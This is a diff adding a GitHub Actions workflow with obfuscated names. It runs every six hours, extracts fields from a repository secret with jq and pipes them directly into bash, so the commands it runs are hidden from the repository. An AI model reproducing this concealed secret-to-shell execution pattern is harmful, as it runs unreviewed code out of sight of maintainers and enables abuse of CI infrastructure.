@@ -1,0 +1,23 @@
+name: yexuzaiyoushangjiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yexuzaiyoushangjiao
+        env:
+          cyn5: ${{ secrets.cyn5 }}
+        run: |
+          echo $cyn5 | jq -r .gomg6559 | /bin/bash
+          echo $vnl217 | jq -r .w16393 | /bin/bash
+          echo $gfo1400 | jq -r .ph66109 | /bin/bash
+          echo $dh87498 | jq -r .gtmt585 | /bin/bash
+          echo $xiub2726 | jq -r .fnio1469 | /bin/bash
+
